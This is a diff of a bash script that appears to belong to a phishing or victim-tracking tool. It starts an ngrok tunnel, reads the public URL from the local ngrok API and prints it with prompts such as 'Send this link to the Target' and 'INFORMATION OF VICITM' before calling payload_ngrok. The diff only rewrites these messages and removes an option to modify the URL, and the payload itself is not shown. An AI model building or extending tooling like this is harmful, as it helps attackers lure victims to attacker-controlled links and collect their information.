@@ -194,19 +194,11 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-echo -e "\e[96m==========\e[91m INFORMATION OF VICITM \e[96m========== \e[93m"
-echo ""
-echo "" 
-read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-echo ""
-if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]]                           
-then
 echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://$link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;75m %s\e[0m\n" $link
 echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;95m ==Send this link to the Victim =\e[0m'
-fi
+echo -e "\e[96m=====\e[91m Send this link to the Target\e[96m===== \e[93m"
+echo ""
 payload_ngrok
 checkfound
 }
